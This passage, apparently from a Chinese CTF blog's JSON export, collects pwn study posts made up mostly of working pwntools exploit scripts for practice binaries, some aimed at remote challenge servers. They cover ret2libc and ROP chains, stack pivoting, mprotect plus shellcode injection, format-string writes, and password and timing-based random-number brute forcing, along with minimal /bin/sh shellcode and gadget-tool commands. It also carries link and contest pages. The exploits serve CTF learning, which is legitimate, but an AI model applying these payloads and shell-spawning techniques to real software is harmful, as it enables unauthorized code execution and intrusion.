0x1f1700\n\np.sendlineafter(\"?\",b\"-11\")\np.sendlineafter(\".\",b'\\x68')\np.sendlineafter(\"?\",b\"-11\")\np.sendlineafter(\".\",p64(flag))\n\np.interactive()\n```\n\n# srop\n\n```\nfrom pwn import *\ncontext.arch='amd64'\ncontext.log_level='debug'\npower_rop1=0x0000000000400806\npower_rop2=0x00000000004007F0\nbuf_inp=0x0000000000601039\npop_rbp=0x0000000000400628\nbss_addr=0x0000000000601050\ndef getpower(avg1,avg2,avg3,got):\n    payload=p64(power_rop1)+p64(0)+p64(0)+p64(1)+p64(got)+p64(avg1)+p64(avg2)+p64(avg3)\n    payload+=p64(power_rop2)+p64(0)*7#为什么是7呢，因为虽然只有6个pop但是上面还有个rsp+8\n    return payload\n\n# p=process('./pwn')\np=process('../出题/pwn3/pwn')\n# p=remote('162.14.104.152','10017')\n# p=remote('nepctf.1cepeak.cn','31507')\n\nelf=ELF('pwn')\nlibc=ELF('./libc-2.27.so')\nsyscall_got=elf.got['syscall']\nseccomp_init_got=elf.symbols['seccomp_init']\n# pause()\n# gdb.attach(p,'b *0x000000000040078D')\n# pause()\n\n\npayload=b'flag\\x00\\x00\\x00\\x00'*(0x30//8)+p64(0x4007b0)\npayload+=getpower(0,0,buf_inp,syscall_got)\n# payload+=getpower(buf_inp,0,0,syscall_got)\npayload+=getpower(1,1,syscall_got,syscall_got)\npayload+=p64(pop_rbp)+p64(buf_inp+8)\n# payload+=getpower(0,0,buf_inp+0x10,syscall_got)\n# payload+=getpower(1,syscall_got,0x20,syscall_got)\n# payload+=p64(elf.symbols['__libc_start_main'])\npayload+=p64(0x000000000040076D)\n# payload+=getpower(buf_inp,0,2,syscall_got)\n# payload+=getpower(3,buf_inp+0x6,0x30,syscall_got)\n# payload+=getpower(1,buf_inp+0x6,0x30,syscall_got)\np.sendlineafter(b'!!!\\n',payload)\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\npause()\np.sendline(b'flag\\x00\\x00\\x00\\x00'+p64(0x601000))\n# pause()\n\n# payload=b'a'*0x30+p64(0x4007b0)\n# payload+=getpower(1,1,syscall_got,syscall_got)\n# payload+=p64(0x000000000040076D)\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\n\n\n# pause()\n# # p.sendline(b'')# 控制rax为1\n# # # 接收libc\nrecvaddr=p.recvuntil(b'\\x7f')\nsysaddr=u64(recvaddr[-6:].ljust(8,b'\\x00'))\nprint(hex(sysaddr))\nlibcbase=sysaddr-libc.symbols['syscall']\nprint('libcbase',hex(libcbase))\n\npop_rax=libcbase+0x000000000001b500\nopen_addr=libcbase+libc.symbols['open']\nread_addr=libcbase+libc.symbols['read']\nwrite_addr=libcbase+libc.symbols['write']\npop_rdi=0x0000000000400813\npop_rdx_rsi=libcbase+0x0000000000130539\npop_rsp=libcbase+0x000000000000396c\npop_rcx=libcbase+0x00000000000e433e\n\npayload=b'flag\\x00\\x00\\x00\\x00'*(0x30//8)+p64(0x4007b0)\npayload+=p64(pop_rax)+p64(2)+p64(pop_rcx)+p64(0)\n# payload+=getpower(buf_inp,0,0,syscall_got)\npayload+=flat([pop_rdi,buf_inp,pop_rdx_rsi,0,0,pop_rbp,buf_inp+0x30,sysaddr+23])\npayload+=p64(pop_rax)+p64(0)\npayload+=flat([pop_rdi,3,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])\npayload+=p64(pop_rax)+p64(1)\npayload+=flat([pop_rdi,1,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])\n# payload+=flat([pop_rdi,buf_inp-1,pop_rdx_rsi,0,0,open_addr])\n# payload+=\npayload+=p64(0x000000000040076D)\nprint('len',len(payload))\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\np.sendlineafter(b'!!!\\n',payload)\n\n# # pop_rax=libcbase+0x000000000001b500\n# # payload2=\n\np.interactive()\n\n\n```\n","categories":["模板"],"tags":["rop"]},{"title":"初探爆破","url":"/2023/08/05/%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/%E5%88%9D%E6%8E%A2%E7%88%86%E7%A0%B4/","content":"\n# 初探爆破\n\n## 可见字符\n\n三位可见字符大概需要半分钟，每多一位时间翻80倍左右，而在服务器条件下每次交互会有大概0.1s延迟，使可见爆破的极限基本锁定在三位\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    char password[100] = \"3h9\";\n    char input[100] = \"\";\n    while (1)\n    {\n        puts(\"input:\");\n        scanf(\"%s\", input);\n        if (!strcmp(password, input))\n            puts(\"flag is flag{heshi_tested_baopo}\");\n        else\n            puts(\"wrong\");\n    }\n}\n\n```\n\n\n\n```python\nfrom pwn import *\np = process(\"./baopo\")\n\nfor i in range(43,125):\n    for j in range(43, 125):\n        for k in range(43, 125):\n                    p.sendlineafter(\":\",p8(i)+p8(j)+p8(k) )\n                    p.recvline()\n                    rcv = p.recvline()\n                    if b'flag' in rcv:\n                        print(rcv)\n                        print(p8(i)+p8(j)+p8(k))\n                        break\np.interactive()\nprint(\"end\")\n```\n\n\n\n## 爆破数字\n\n六位密码的爆破基本上可以在几分钟内完成，在服务器条件可能需要延长到半小时内。\n\n```python\nfrom pwn import *\n#context.log_level=\"debug\"\np = process(\"./baopo\")\n\nfor i in range(1000000):\n                    p.sendlineafter(\":\",str(i) )\n                    p.recvline()\n                    rcv = p.recvline()\n                    if b'flag' in rcv:\n                        print(rcv)\n                        print(i)\n                        break\np.interactive()\nprint(\"end\")\n```\n\n\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    char password[100] = \"839325\";\n    char input[100] = \"\";\n    while (1)\n    {\n        puts(\"input:\");\n        scanf(\"%s\", input);\n        if (!strcmp(password, input))\n            puts(\"flag is flag{heshi_tested_baopo}\");\n        else\n            puts(\"wrong\");\n    }\n}\n\n```\n\n","categories":["笔记"],"tags":["探索"]},{"title":"pwn从头开始的复习（rop中级篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E4%B8%AD%E7%BA%A7%E7%AF%87%EF%BC%89/","content":"\n\n\n# libcsearcher\n\nret2libc的时候不一定会给libc（大多数情况不给）\n\n所以需要这个工具去根据泄露出来的libc搜索版本\n\n给一个例题，本题有多解，我自己写了三解\n\n[例题下载](/downloads_fuxi/PicoCTF_2018_rop_chain)\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\n\np = remote('node4.buuoj.cn',26558)\nlibc = ELF(\"libc-2.27.so\")\ncontext.log_level=\"debug\"\nelf=ELF(\"PicoCTF_2018_rop_chain\")\nputs_plt=elf.plt[\"puts\"]\nputs_got=elf.got[\"puts\"]\nmain_addr=elf.sym[\"main\"]\npayload=(28)*b'a'+p32(puts_plt)+p32(main_addr)+p32(puts_got)\np.sendlineafter(\">\",payload)\nputs_addr = u32(p.recvuntil('\\xf7')[-4:])\n\nlibc_base=puts_addr-libc.sym['puts']\nsystem=libc_base+libc.sym['system']\nsh=libc_base+next(libc.search(b'/bin/sh'))\npayload_=28*b'a'+p32(system)+p32(main_addr)+p32(sh)\np.sendlineafter(\">\",payload_)\np.interactive()\n\n```\n\n\n\n# mprotect\n\nmprotect这是一个函数，可以修改一段区域的权限，遇到的时候就能考虑使用\n\nmprotect 函数用于设置一块内存的保护权限（将从 start 开始、长度为 len 的内存的保护属性修改为 prot 指定的值），函数原型如下所示：\n\n```\n#include <sys/mman.h>\n\nint mprotect(void *addr, size_t len, int prot);\nprot 的取值如下，通过 |\n 可以将几个属性结合使用（值相加）：\n- PROT_READ：可写，值为 1\n- PROT_WRITE：可读， 值为 2\n- PROT_EXEC：可执行，值为 4\n- PROT_NONE：不允许访问，值为 0\n```\n\n[例题下载](/downloads_fuxi/mprotect)\n\n```\nfrom pwn import *\nq = remote('node4.buuoj.cn',28807)\n#q = process('./get_started_3dsctf_2016')\ncontext.log_level = 'debug'\nsleep(0.1)\n\npayload = b'a'*56\npayload += p32(0x080489A0) + p32(0x080489A0)\npayload += p32(0x308CD64F) + p32(0x195719D1)\nq.sendline(payload)\nsleep(0.1)\nq.interactive()\n\n\nfrom pwn import *\nq = remote('node3.buuoj.cn',29645)\n#q = process('./get_started_3dsctf_2016')\ncontext.log_level = 'debug'\n\nmprotect = 0x0806EC80\nbuf = 0x80ea000\npop_3_ret = 0x0804f460\nread_addr = 0x0806E140\n\npayload = 'a'*56\npayload += p32(mprotect)\npayload += p32(pop_3_ret)\npayload += p32(buf)\npayload += p32(0x1000)\npayload += p32(0x7)\npayload += p32(read_addr)\npayload += p32(buf)\npayload += p32(0)\npayload += p32(buf)\npayload += p32(0x100)\nq.sendline(payload)\nsleep(0.1)\n\nshellcode = asm(shellcraft.sh(),arch='i386',os='linux')\nq.sendline(shellcode)\nsleep(0.1)\nq.interactive()\n\n```\n\n\n\n# 栈迁移\n\n用来解决溢出量不够的rop\n\n可以先通过leave|ret控制栈地址，再返回到溢出点，就可以衔接两次溢出\n\n先去ROPgetdet去找leave|ret\n\n```\nROPgadget --binary pwn --only \"leave|ret\"\n```\n\n[例题下载](/downloads_fuxi/ciscn_2019_es_2)\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\nsys_addr=0x08048400\np = remote('node4.buuoj.cn',25264)\npayload1 = b'a'*0x27+b'@'\np.send(payload1)\np.recvuntil(b'@')\nebp = u32(p.recv(4))\nprint (\"ebp----->\",hex(ebp))\nleave_ret=0x080484b8\npayload2=b'aaaa'+p32(sys_addr)+4*b'a'+p32(ebp-0x28)+b'/bin/sh'+b'\\0'+16*b'a'+p32(ebp-0x38)+p32(leave_ret)\n#                4            8     12             16      23   24       40    44\n#        38     34            30    2c             28\np.send(payload2)\np.interactive()\n```\n\n","categories":["复习"],"tags":["rop"]},{"title":"pwn从头开始的复习（rop高级篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E9%AB%98%E7%BA%A7%E7%AF%87%EF%BC%89/","content":"\n除了之前的一般的rop，还有一些高级的运用，srop和frop\n\n# srop\n\n还没完全学成，在我的导航里面有参考资料\n\n```\nfrom pwn import *\ncontext.arch='amd64'\ncontext.log_level='debug'\npower_rop1=0x0000000000400806\npower_rop2=0x00000000004007F0\nbuf_inp=0x0000000000601039\npop_rbp=0x0000000000400628\nbss_addr=0x0000000000601050\ndef getpower(avg1,avg2,avg3,got):\n    payload=p64(power_rop1)+p64(0)+p64(0)+p64(1)+p64(got)+p64(avg1)+p64(avg2)+p64(avg3)\n    payload+=p64(power_rop2)+p64(0)*7#为什么是7呢，因为虽然只有6个pop但是上面还有个rsp+8\n    return payload\n\np=process('./pwn')\n\n\n#p=remote(\"ctf.v50to.cc\",10402)\nelf=ELF('pwn')\nlibc=ELF('./libc-2.27.so')\nsyscall_got=elf.got['syscall']\nseccomp_init_got=elf.symbols['seccomp_init']\n\n\n\npayload=b'flag\\x00\\x00\\x00\\x00'*(0x30//8)+p64(0x4007b0)\npayload+=getpower(0,0,buf_inp,syscall_got)\n\npayload+=getpower(1,1,syscall_got,syscall_got)\npayload+=p64(pop_rbp)+p64(buf_inp+8)\n\npayload+=p64(0x000000000040076D)\n\np.sendlineafter(b'!!!\\n',payload)\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\np.sendline(b'flag\\x00\\x00\\x00\\x00'+p64(0x601000))\n# pause()\n\n\nrecvaddr=p.recvuntil(b'\\x7f')\nsysaddr=u64(recvaddr[-6:].ljust(8,b'\\x00'))\nprint(hex(sysaddr))\nlibcbase=sysaddr-libc.symbols['syscall']\nprint('libcbase',hex(libcbase))\n\npop_rax=libcbase+0x000000000001b500\nopen_addr=libcbase+libc.symbols['open']\nread_addr=libcbase+libc.symbols['read']\nwrite_addr=libcbase+libc.symbols['write']\npop_rdi=0x0000000000400813\npop_rdx_rsi=libcbase+0x0000000000130539\npop_rsp=libcbase+0x000000000000396c\npop_rcx=libcbase+0x00000000000e433e\n\npayload=b'flag\\x00\\x00\\x00\\x00'*(0x30//8)+p64(0x4007b0)\npayload+=p64(pop_rax)+p64(2)+p64(pop_rcx)+p64(0)\n# payload+=getpower(buf_inp,0,0,syscall_got)\npayload+=flat([pop_rdi,buf_inp,pop_rdx_rsi,0,0,pop_rbp,buf_inp+0x30,sysaddr+23])\npayload+=p64(pop_rax)+p64(0)\npayload+=flat([pop_rdi,3,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])\npayload+=p64(pop_rax)+p64(1)\npayload+=flat([pop_rdi,1,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])\n# payload+=flat([pop_rdi,buf_inp-1,pop_rdx_rsi,0,0,open_addr])\n# payload+=\npayload+=p64(0x000000000040076D)\nprint('len',len(payload))\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\np.sendlineafter(b'!!!\\n',payload)\n\n# # pop_rax=libcbase+0x000000000001b500\n# # payload2=\n\np.interactive()\n```\n\n# frop\n\n就是iofile，在我的导航里面有\n","categories":["复习"],"tags":["rop"]},{"title":"pwn从头开始的复习（rop初级篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E7%AF%87%EF%BC%89/","content":"\n本篇将以难度顺序讲解各种难度的pwn，因为传参方式不同，这里给两类64位和32位\n\n我直接给出未解释的地址一般是ida给的或者ROPgadget 给的，去看我的模板去\n\n# ret2shell（直接留了后门，最简单的，新手入门用）\n\n## 32位\n\n[ret2shell32例题下载](/downloads_fuxi/ret2shell32)\n\n```\nfrom pwn import *\np = process('./ret2shell32')\ncontext.log_level=\"debug\"\n\npayload=(0x6C+4)*b'a'+p32(0x080485CB)\np.sendlineafter(\"Please enter your string:\",payload)\np.interactive()\n#你的当前文件夹下没有flag，显示Flag File is Missing.就代表通了\n\n```\n\n## 64位\n\n[ret2shell64例题下载](/downloads_fuxi/ret2shell64)\n\n```\nfrom pwn import *\n# remote()建立远程连接,指明ip和port\nio = remote('node4.buuoj.cn',29823)\n#io=process(\"./ret2shell64\")\npayload = b'a'*(0x40 + 0x8) + p64(0x40060D)\nio.sendline(payload) #发送数据\nio.interactive() #与shell进行交互\n\n#这里好像64和32没什么区别\n```\n\n\n\n# ret2system（比前面那个难一丢丢，直接给了system函数）\n\n例题来自buu ：ciscn_2019_ne_5，也可以到网上看看别人的题解\n\n## 32位\n\n[ret2system32例题下载](/downloads_fuxi/ret2system32)\n\n本题比较水，出题人偷偷地留了一个带‘sh’的字符串，可以作为参数传给system直接getshell\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\n#p = remote('node4.buuoj.cn',29730)\np = process(\"./ret2system32\")\n\np.sendlineafter(\"password:\",b'administrator')#逆向一下，绕过字符串检测\np.sendlineafter(\"0.Exit\\n:\",b'1')\npayload=b\"a\"*76+p32(0x080484D0)+  4*b'a'  +p32(0x080482ea)\n     #          sys函数plt       填充ebp     sh字符串地址\np.sendlineafter(\"new log info:\",payload)\np.sendlineafter(\"0.Exit\\n:\",b'4')\np.interactive()\n\n\n#ROPgadget --binary ./ciscn_2019_ne_5 --string 'sh'\n#这是一条ROPgadget指令，环境配好以后可以查找文件中的sh字符串位置\n```\n\n## 64位\n\n实在找不到啦，关于64位和32位的区别在下一阶段可以了解，这段算了\n\n# ret2libc（真正进入pwn的第一步）\n\n这部分主要是借助一些输出函数write，puts，printf泄露出一个函数的真实地址，进而得到libc的真实地址，可以调用libc里的任意函数getshell\n\n由于每个程序里面的输出函数不一致，需要的参数也不同，所以exp略有区别\n\n下面是一道32位利用write泄露题的exp\n\n## 32位write\n\n[write32下载](/downloads_fuxi/write32)\n\nlibc下载：https://buuoj.cn/resources 在里面选择32位libc-2.23.so\n\n\n\n```\nfrom pwn import *\n\n#io=remote('node4.buuoj.cn',28321)\nio=process('./pwn')\nelf=ELF('./babyrop')\nlibc=ELF('./libc-2.23.so')\n\nsystem_libc=libc.symbols['system']\nbinsh_libc=next(libc.search(b'/bin/sh'))\n\nwrite_libc=libc.symbols['write']\nwrite_plt=elf.plt['write']\nwrite_got=elf.got['write']\n\nmain_addr=0x8048825\npayload=b'\\x00'+b'\\xff'*10\nio.sendline(payload)\n\nio.recvuntil(b\"Correct\\n\")\npayload=b'a'*(0xe7+4)+p32(write_plt)+p32(main_addr)\n#                    ret1           ret2\npayload+=p32(1)+p32(write_got)+p32(4)\n#write   par1   par2           par3\nio.sendline(payload)\nwrite_addr=u32(io.recv(4))\nbase=write_addr-write_libc\n\n\nsystem_addr=system_libc+base\nbinsh_addr=binsh_libc+base\npayload=b'\\x00'+b'\\xff'*10\nio.sendline(payload)\nio.recvuntil(b\"Correct\\n\")\npayload=b'a'*(0xe7+4)+p32(system_addr)+p32(main_addr)\npayload+=p32(binsh_addr)\nio.sendline(payload)\nio.interactive()\n# rdi, rsi, rdx, rcx, r8, r9\n\n```\n\n## 64位write\n\n[write64下载](/downloads_fuxi/write64)\n\nlibc下载：https://buuoj.cn/resources 在里面选择32位libc-2.23.so\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',26446)\nelf=ELF(\"level3_x64\")\nmain_addr = elf.sym['main']\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\npop_rdi_ret=0x00000000004006b3\npop_rsi_r15_ret=0x00000000004006b1\n\npayload =b'a' * (0x80+8) + p64(pop_rdi_ret) +p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0) +p64(write_plt)+ p64(main_addr)\np.sendlineafter(\":\",payload)\n\nwrite_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(write_addr))\n\nlibc = ELF(\"libc-2.23.so\")\nlibc_base = write_addr - libc.sym['write']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + next(libc.search(b'/bin/sh'))\nret_addr=0x00000000004004c9\n\npayload2 =b'a' * (0x80+8)  +p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)\np.sendlineafter(\":\",payload2)\np.interactive()\n\n```\n\n剩下两种懒得写了，和write只有参数不同，有兴趣自己到网上找找，或者去heshi的github去捞\n\n","categories":["复习"],"tags":["rop"]},{"title":"pwn从头开始的复习（shellcode篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88shellcode%E7%AF%87%EF%BC%89/","content":"\n\n\nz\n\n\n\n# 最简单的shellcode，写什么执行什么\n\n直接用shellcode.sh生成，再asm转换为二进制\n\n[例题下载](\\source\\downloads_fuxi\\shellcode1)\n\n```\nfrom pwn import *\n# remote()建立远程连接,指明ip和port\nio = remote('node4.buuoj.cn',28957)\ncontext(log_level = \"debug\",arch = \"i386\",os = \"linux\")\n#io=process(\"./level1\")\nio.recvuntil(\"What's this:\")\nbuf_addr=io.recvuntil(b\"?\")\nbuf_addr= buf_addr[:-1]\nshellcode = asm(shellcraft.sh())\npayload = shellcode.ljust(140,b'a')+p32(int(buf_addr, 16))\nio.sendline(payload) #发送数据\nio.interactive() #与shell进行交互\n\n```\n\n# 存在过滤的shellcode\n\n去我的分组对抗1看看，熊写了一道\n\n机器码对应汇编： https://blog.csdn.net/weixin_43708844/article/details/103211703\n\n# 长度不足的shellcode\n\n找目前最短的shellcode，有别的想法可以接着开发\n\ni386长度18\n\n```bash\npush   0xb\npop    eax\npush   ebx\npush   0x68732f2f\npush   0x6e69622f\nmov    ebx,esp\nint    0x80\n```\n\n amd64长度22\n\n```bash\nxor \trsi,\trsi\t\t\t\npush\trsi\t\t\t\t\nmov \trdi,\t0x68732f2f6e69622f\t \npush\trdi\npush\trsp\t\t\npop\trdi\t\t\t\t\nmov \tal,\t59\t\t\t\ncdq\t\t\t\t\t\nsyscall\n```\n\n","categories":["复习"],"tags":["shellcode"]},{"title":"pwn从头开始的复习（工具使用）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%89/","content":"\n\n\n# glibc-all-in-one\n\n在glibc-all-in-one目录下\n\n## 获取可下载的libc列表\n\n```\ncat list \n```\n\n```\n./download name\n```\n\n## 查看对应连接器\n\n```\nstrings buu/libc-2.23-x64.so | grep ubuntu\n```\n\n## 查看目前链接信息\n\n```\nldd -v pwn\n```\n\n## 换源\n\n```\npatchelf --replace-needed libc.so.6  /home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 heap_Double_Free\n```\n\n```\npatchelf --set-interpreter /home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./heap_Double_Free \n```\n\n\n\n# Onegadget \n\n```\none_gadget filename  #libc文件名\n```\n\n一运行就能拿到shell的地址，但是会标使用条件，找能实现的搞就好\n\n#  ROPgadget\n\n## 搜索ret指令的地址\n\n```\n ROPgadget  –binary filename –only ‘ret’ \n```\n\n## 控制寄存器用\n\n```\nROPgadget --binary fliename --only \"pop|ret\"\n```\n\n## 静态编译文件直接得到完整rop链\n\n```\nROPgadget --binary fliename --ropchain \n```\n\n## 搜索字符串，给出字符串地址\n\n```\nROPgadget --binary ./fliename --string 'sh'\n```\n\n# 下面是一些零散的小python语句\n\n```\n context(log_level = \"debug\",arch = \"i386\",os = \"linux\") \n \\#表明系统 \n```\n\n```\npayload = fmtstr_payload(offset, {atoi_got : sys_plt}) \n自动生成fmt_payload\n```\n\n```\n shellcode = asm(shellcraft.sh())#<-这里利用pwntools的asm()函数来写shellcode. \n```\n\n```\npayload = flat([shellcode.ljust(padding,'A'),buf_addr])\n\n这段代码是将shellcode和buf_addr连接成一个字符串，其中shellcode右侧填充'A'字符，直到字符串长度为padding。然后使用flat函数将这个字符串转换为二进制格式，以便在后续的操作中使用。\n```\n\n## 应付pie\n\n```\nfor k in range(500): \n    p.recvuntil(b'welcome\\n') \n    i=random.randint(0,14) \n    payload = b'A'*104 +canary+p64(0x7fffffffdddddddd) + p8(0x31)+p8(0x02+i*16) \n    p.send(payload) \n    \n```\n\n","categories":["复习"],"tags":["工具"]},{"title":"pwn从头开始的复习（工具篇）","url":"/2023/08/26/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AF%87%EF%BC%89/","content":"\n\n\n# 前言\n\n开学在即，复习一遍pwn。顺便给后人留点东西。\n\n# 所需软件及软件包\n\n## 写笔记用：\n\nTypora （便于上传博客，再没用过word写笔记）\n\n## c语言：\n\ncode blocks（代码补全，报错提示和调试做得都很好，而且比用来写项目的操作简单打开快）\n\n## Python：\n\nPyCharm（好用没得说）\n\n## 编辑二进制：\n\nvscode（免费且插件多，必备）配置hex editor\n\n## 查看程序源代码和反汇编：\n\nida \n\n##  另外：\n\n需要一款科学上网软件。由于本篇文章要上云，我就不提了。\n\n## Linux64位虚拟机\n\n乌班图和kali都可，建议乌班图，虽然kali主打一个网络安全，但乌班图支持的软件更多一些。\n\n### 下面是虚拟机里面需要的东西：\n\npython3（无需编辑器，在主机编，虚拟机带不动，能运行就行）\n\npython需要的软件包（安装指令去csdn找）：\n\n1.pwntools\n\n2.pwngdb\n\n3.libcsearcher\n\n需要安装的指令：\n\n1.Onegadget\n\n2.ROPgadget\n\n这些搞完就可以做题了\n\n# 学习资源\n\n参照西电的pdf，一篇就够了，一千多页\n\nchatgpt，不懂就问它，它真什么都会\n\n# 刷题网站\n\nbuuctf，pwn按照解出人数排，第一页做完就算入门了，做两页就行，后面的难度层次不齐\n\n西电ctf，我自己也在做，每年都开两个月，质量蛮不错\n\n做不出来的百度一下，这些网站比较大众，每题都有人写WP和总结\n\n","categories":["复习"],"tags":["工具"]},{"title":"破解随机数","url":"/2023/09/23/%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/%E7%A0%B4%E8%A7%A3%E9%9A%8F%E6%9C%BA%E6%95%B0/","content":"\n今天突然在想，用time（0）当随机数种子真的安全吗？\n\n于是有了今天的小测试\n\n# docker端程序\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include<time.h>\nint main()\n{\n    srand(time(0));\n    int guess;\n    int randm=rand()%1000000;\n    scanf(\"%d\",&guess);\n    if(guess==randm)\n    {\n        system(\"/bin/sh\");\n    }\n    else\n    {\n        printf(\"rand:%d\",randm);\n    }\n\n}\n\n\n```\n\n## 我的exp（第一部分c语言）\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include<time.h>\nint main()\n{\n    srand(time(0)+10);//提前十秒\n    int randm=rand()%1000000;\n    printf(\"rand:%d\\n\",randm);\n    \n}\n```\n\n## 第二部分（python）\n\n```\nfrom pwn import *\ncontext.log_level='debug'\ncontext(os = 'linux', arch = 'amd64')\nexp = process('./exp')\nrand=exp.recvline()[5:]\n\nfor i in range(12):\n   p = process('./time')\n   p.send(rand)\n   p.interactive()\n```\n\n最后很轻易地通了，time（0）是一秒一变，而srand(time(0)）又和电脑没关系，所以可以轻易地得到几秒以后的随机数，然后爆破，等他。\n","categories":["笔记"],"tags":["探索"]},{"title":"pwn从头开始的复习（fmt篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88fmt%E7%AF%87%EF%BC%89/","content":"\n具体学习去看西电文档\n\n# 格式化字符串修改栈内容\n\n```\nfrom pwn import *\n# remote()建立远程连接,指明ip和port\nio = remote('node4.buuoj.cn',29147)\n#io=process(\"./printf\")\npayload= p32(0x0804C044) + b\"%10$n\"\nio.sendlineafter(\"your name:\",payload) #发送数据\nio.interactive() #与shell进行交互\n#0804c044\n```\n\n# 高级运用\n\n我自己出的题，字符串空间严重不足，必须利用栈空间\n\n[fmt下载](/downloads_fuxi/fmt)\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\np=remote(\"ctf.v50to.cc\",10286)\n#p=process(\"./fmt\")\nfor i in range(5):\n    p.recvuntil(\"what's \")\n    a = p.recvuntil(\" add \")[:-4]\n    b = p.recvuntil(\"\\n\")[:-1]\n    c = int(a) + int(b)\n    print(c)\n    p.sendline(str(c))\np.sendlineafter(\"Cherish it\",b'1')\nfmt=b\"%10$p^\"\np.sendlineafter(\"Input:\",fmt)\np.recvuntil(\":\")\nebp=int(p.recvuntil(\"^\")[:-1],16)\nsleep(1)\nret_game_addr=ebp+8\na=ret_game_addr%0x100\nprint(a)\n\n\np.sendlineafter(\"[2]leave\",b'1')##weiyi=8\nfmt=b\"%\"+str(a).encode()+b\"c%10$hhn\"\np.sendlineafter(\"Input:\",fmt)##ebp=10 ret=11\nsleep(1)\n\n#attach(p)\np.sendlineafter(\"[2]leave\",b'1')#ebp=14 ret=15\nfmt=b\"%40c%14$hhn\"\np.sendlineafter(\"Input:\",fmt)\np.interactive()\n```\n\n","categories":["复习"],"tags":["fmt"]},{"title":"about","url":"/about/index.html","content":""},{"title":"近期比赛","url":"/games/index.html","content":"\n# “古剑山\"第一届全国大学生网络攻防大赛初赛\n\n比赛链接: https://www.cqyti.com/info/1143/390372.htm\n\n比赛类型:团队赛|1-3人\n\n报名开始:2023年09月15日18:00:00\n\n报名截止:2023年11月08日18:00:00\n\n比赛开始:2023年12月08日09:00:00\n\n比赛结束:2023年12月08日12:00:00\n\nQQ群:792721897\n\n"},{"title":"友链","url":"/links/index.html","content":"\n# 我的\n\n[ChatGPT](https://www.gpt.heshi906.xyz/)\n\n[NPUSEC_GitLab](https://git.qwq.cc/npusec2022)\n\n[NPU::CTF](https://ctf.qwq.cc/)\n\n[主页 | AList](http://10.81.2.230:5244/)\n\n# 大师傅们\n\n[xiong's blog - 心血来潮的产物捏～](https://1145.link/)熊神！懂得都懂\n\n[Jelasin](https://jelasin.github.io/) IoT\n\n[korey0sh1](https://korey0sh1.cn/) IoT 人民公安大爹\n\n[TokameinE](https://tokameine.top/) PWN大爹\n\n[Nameless](https://nameless.top/) DAS出题人 IOT大爹\n\n[z1r0's blog](https://www.z1r0.top/) IOT爹\n\n[lewiserii's blog](https://lewiserii.github.io/) 全栈爹，护网，渗透，各种工具，偏web\n\n"},{"title":"导航","url":"/daohang/index.html","content":"\n# 学习资料\n\n[西电文档在线版](https://www.wenjiangs.com/doc/qlkg1aykwf)\n\n[CookedMelon/Pwn-in-practice: 记录学习pwn的笔记和遇到的题目](https://github.com/CookedMelon/Pwn-in-practice)\n\n# 还没看的WP\n\n[官方Write Up｜DASCTF六月赛 · 二进制专项 | CTF导航](https://www.ctfiot.com/118808.html)\n\n# 工具\n\n[awd pwn通防小工具](https://blog.csdn.net/qq_45595732/article/details/125472253)\n\n[masscan扫描端口](https://blog.csdn.net/weixin_51730169/article/details/124627178)\n\n[AabyssZG/AWD-Guide: 